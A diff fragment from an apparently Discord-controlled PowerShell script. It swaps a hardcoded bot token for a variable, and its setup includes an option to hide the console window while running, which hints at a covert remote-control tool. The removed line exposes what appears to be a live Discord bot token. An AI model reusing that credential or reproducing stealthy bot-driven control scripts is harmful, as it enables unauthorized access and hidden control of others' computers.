@@ -13,7 +13,7 @@
 - The Discord bot you use must be in one server ONLY
 #>
 # =====================================================================================================================================================
-$global:token = "MTM5NzkxNDM2MTg3MTQ2NjUxNg.GTvwUH.NTx9rY8y7ZL0NuWwqBxTMLpkLiOu7jD3YH6WzU"
+$global:token = $tk
 # =============================================================== SCRIPT SETUP =========================================================================
 
 $HideConsole = 1 # HIDE THE WINDOW - Change to 1 to hide the console window while running
